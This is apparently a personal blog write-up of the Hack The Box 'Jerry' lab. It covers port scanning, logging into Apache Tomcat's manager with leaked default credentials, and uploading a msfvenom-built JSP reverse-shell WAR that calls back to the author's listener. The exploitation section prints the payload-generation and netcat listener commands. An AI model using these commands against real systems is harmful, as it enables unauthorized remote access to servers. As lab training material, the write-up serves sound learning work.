---
layout: post
title:  "Jerry Writeup - Hack The Box"
date:   2024-01-02
desc: "Information Leakage, Apache Tomcat Abuse"
keywords: "HTB,eJPT,Easy,Windows,ApacheTomcat"
categories: [HTB]
tags: [HTB,eJPT,Windows,ApacheTomcat,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

Well, this [Hack The Box](https://www.hackthebox.com/){:target="_blank"} represents a low complexity, but for someone who is just starting with **Pentest** can be friendly to begin to know the platform and its rules. The **Jerry** machine is easy and you can learn some concepts of malicious files and **Reverse Shell**, here I go!

<br/><br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

With the **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** script I deploy the box, and verify the connectivity with it. I also have the script `whichSystem.py` to take advantage of the **TTL** and check the operating system of the victim machine. With `nmap` I enumerate the ports, services and their versions that I am going to try to breach. In this case I only find one open port, **8080**, and it also has an **Apache Tomcat 7.0.88** deployed, so I am already thinking about a possible vulnerability to exploit. With `searchsploit` I find several exploits for this type of server and with `whatweb` I confirm the technology being deployed in the web service exposed on port **8080**.

```bash
./htbExplorer -d Jerry
```

```bash
ping -c 1 10.10.10.95
whichSystem.py 10.10.10.95
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.95 -oG allPorts

nmap -sCV -p8080 10.10.10.95 -oN targeted
nmap -sCV -p8080 10.10.10.95 -oN targeted -Pn

cat targeted
# 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

whatweb http://10.10.10.95:8080
searchsploit tomcat 7.0
```

<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I've already made several **Hack The Box** machines and exploited an **Apache Tomcat** server, but for someone just starting out in the field of **Informatic Security**, there is **[HackTricks](https://book.hacktricks.xyz/){:target="_blank"}**, which has all the information and resources if you have any questions, I always go to this site. There is an article, **[Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat){:target="_blank"}**, that gives me all the information and articles I can read to understand how to exploit the vulnerability. There is an **Information Leak** on the web page, which not only tells me the **Apache Tomcat** server version, it also shows me the default credentials. Once I sign-in, I check that I have the ability to upload a `.war` file.

<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I have the possibility to upload files to the server, I only have to use `msfvenom` to create an exploit to send a **Reverse Shell** to my terminal, I open a port with `nc` in listening mode, load the malicious `.war` and access from the browser to the resource, I was able to access the **Windows** machine.

```bash
msfvenom -l payload | grep java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o reverse.war

rlwrap nc -nlvp 443
```

<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I just have to use some recognition commands in the system and explore the directories a little bit and I find not only the first flag but both together in the same file.

```powershell
whoami
hostname

type "2 for the price of 1.txt"
```

<br/>
<img src="{{ site.img_path }}/jerry_writeup/Jerry_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> This box is very simple, but you can learn some concepts, and you can even look for an alternative way to exploit it. Now I'm going to kill the box with **htbExplorer** and look for a new challenge.

```bash
./htbExplorer -k Jerry
```
